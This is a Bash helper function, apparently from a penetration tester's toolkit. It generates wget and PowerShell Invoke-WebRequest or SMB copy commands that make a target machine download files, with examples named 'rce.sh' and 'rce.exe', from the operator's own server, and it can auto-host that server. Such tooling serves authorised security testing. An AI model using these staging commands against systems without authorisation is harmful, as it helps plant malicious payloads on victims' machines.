# Description: one-liner to ship files to the target machine. With no copy-paste needs.
# Usage: ship [-h, --help] [-t|--type <linux|windows>] [-a|--auto-host <boolean>] [-m, --mode <http|smb>] [-p, --port PORT] <filepath 1> [filepath 2] ...
# Arguments:
#   -t, --type <type>: linux or windows (default: linux)
#   -a, --auto-host <boolean>: auto-host the http server (default: true)
#   -m, --mode <mode>: http or smb (default: http)
#   -p, --port PORT: used port (current only support on http)
#   filepath: the path to the file you want to ship. Support multiple files at a time.
# Example:
#   ship ./rce.sh
#   ship -t windows $windows_family
#   ship -t windows -m smb ./rce.exe
function ship() {
    [[ $# -eq 0 || $1 == "-h" || $1 == "--help" ]] && _help && return 0

    local type="linux"
    local mode="http"
    local autoHost=true
    local filepaths=()
    local used_port="80"
    # TODO: implement default output path

    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--type) type="$2" && shift 2 ;;
            -a|--auto-host) autoHost="$2" && shift 2 ;;
            -m|--mode) mode="$2" && shift 2 ;;
            -p|--port) used_port="$2" && shift 2 ;;
            *) filepaths+=("$1") && shift ;;
        esac
    done

    [[ ${#filepaths[@]} -eq 0 ]] && _logger error "[e] At least one filepath is required." && _help && return 1

    local all_cmds=""

    for filepath in "${filepaths[@]}"; do
        [[ ! -f "$filepath" ]] && _logger error "[e] File '$filepath' does not exist." && return 1
    
        local filename=$(basename "$filepath")
        cp --update=none "$filepath" "./$filename" && _logger info "[i] File '$filename' copied to current directory."

        local cmd
        if [[ "$type" == "linux" ]]; then
            if [[ "$mode" == "http" ]]; then
                cmd="wget $(_get_default_network_interface_ip):$used_port/$filename"
            else
                _logger error "[e] Currently Linux only support HTTP mode." && return 1
            fi
        elif [[ "$type" == "windows" ]]; then
            if [[ "$mode" == "smb" ]]; then
                cmd="copy \\\\\\$(_get_default_network_interface_ip)\\\\smb\\\\$filename C:/ProgramData/$filename"
            elif [[ "$mode" == "http" ]]; then
                cmd="powershell -c \"Invoke-WebRequest -Uri 'http://$(_get_default_network_interface_ip):$used_port/$filename' -OutFile C:/ProgramData/$filename\""
            else
                _logger error "[e] unsupported type (smb|http)."
            fi
        else
            log error "[e] Unknown type '$type'." && return 1
        fi

        all_cmds+="$cmd"$'\n'
    done

    _autoHost() {
        if [[ "$autoHost" = true ]]; then
            if [[ "$mode" == "smb" ]]; then
                svc smb
            elif [[ "$mode" == "http" ]]; then
                svc http --port "$used_port"
            fi
        else
            _logger warn "[w] Remember to host the web server on your own"
        fi
    }

    echo -n "$all_cmds" | xclip -selection clipboard
    _logger info "[i] All commands copied to clipboard."
    _autoHost

    # TODO: remove the copied files automatically with global conf
}